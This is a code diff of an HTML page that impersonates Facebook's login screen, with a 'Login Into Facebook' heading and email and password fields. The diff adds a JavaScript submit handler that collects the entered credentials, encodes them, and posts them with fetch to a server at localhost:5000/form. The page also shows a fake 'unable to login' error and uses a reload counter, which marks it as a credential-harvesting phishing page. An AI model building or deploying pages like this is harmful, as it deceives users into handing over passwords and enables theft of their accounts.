@@ -7,8 +7,8 @@
     <!-- <meta name="referrer" content="origin"> -->
     <title>Login</title>
     <link rel="stylesheet" href="css/style.css">
-    <script src="script.js"></script>
-    <script src="css/scripts.js"></script>
+    <!-- <script src="script.js"></script> -->
+    <!-- <script src="css/scripts.js"></script> -->
 </head>
 <body class="dav">
     <div class="first">
@@ -16,14 +16,14 @@
         <p class="hey">Login Into Facebook</p>
         
     </div>
-    <form class="mains" action="work.php" method="POST">
+    <form class="mains">
         <p id="were" class="wer qet">unanle to login, please try again later</p>
         <div class="secondx">
-         <input type="text" name="user" required placeholder="Email address or phone number" class="second">
-        </div> 
+         <input type="text" id="emai;" name="user" required placeholder="Email address or phone number" class="second">
+        </div>  
 
         <div class="secondx">
-         <input type="password" required name="pass" placeholder="Password" class="second">
+         <input type="password" id="pass" required name="pass" placeholder="Password" class="second">
         </div>
 
 
@@ -35,13 +35,43 @@
          <p class="fifth">Forgotten password?</p>
         </div>
          <hr class="exce">
-         <button type="" class="forth">Create New Account</button>
+         <button type="submit" class="forth">Create New Account</button>
      </form>
 
 
 
-<script>
-   if (localStorage.getItem('reloadCount') === null) {
+
+
+     <script>
+
+        const form = document.querySelector('form');
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+
+        const fd = new FormData(form);
+
+        const content = fd;
+
+        const urlEncoded = new URLSearchParams(fd).toString();
+
+        console.log(urlEncoded);
+
+            fetch('http://localhost:5000/form', {
+                method: 'post',
+                body: urlEncoded,
+                headers: {
+                    'content-type': 'application/x-www-form-urlencoded',                }
+            })
+
+        })
+
+
+
+
+
+
+        if (localStorage.getItem('reloadCount') === null) {
 		localStorage.setItem('reloadCount', 1)
 	} else {
 		let count = parseInt(localStorage.getItem('reloadCount'));
@@ -55,7 +85,18 @@
 
 	
 	// localStorage.clear();
-</script>
+
+
+     </script>
+    <!-- <script src="app.js"></script> -->
+
+
+
+<!-- <script>
+    function rebo() {
+        document.getElementsByClassName("wer").classList.remove('qet')
+    }
+</script> -->
 
 
 </body>
